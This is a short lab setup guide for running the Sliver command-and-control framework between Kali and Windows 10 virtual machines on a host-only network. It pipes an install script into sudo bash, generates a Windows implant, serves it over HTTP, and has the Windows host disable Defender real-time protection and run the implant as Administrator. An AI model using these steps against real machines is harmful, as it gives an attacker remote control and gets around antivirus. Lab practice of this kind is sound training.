# Lab Setup Instructions

## VirtualBox Configuration
Both VMs on same Host-Only Network
├── Kali Linux : 192.168.56.102
└── Windows 10 : 192.168.56.20

## Kali Setup
```bash
# Install Sliver
curl https://sliver.sh/install | sudo bash

# Launch server
sudo sliver-server

# In Sliver console
mtls                                    # Start mTLS listener
generate --mtls 192.168.56.102 --os windows --save /home/joyboy/Desktop/payload.exe
```
Windows 10 Setup
Disable Windows Defender (lab only):

Windows Security → Virus & threat protection

Manage settings → Real-time protection OFF

Download payload:

http://192.168.56.102:8000/payload.exe
Execute as Administrator

File Transfer (Kali)
```bash
cd /home/joyboy/Desktop
python3 -m http.server 8000
```
Network Verification
```bash
# From Kali
ping 192.168.56.20

# From Windows
ping 192.168.56.102
```
Troubleshooting
Issue	Solution
No session	Check Defender is OFF
404 error	Verify filename matches
Permission denied	Run chmod 644 payload.exe
Session timeout	Regenerate with current IP
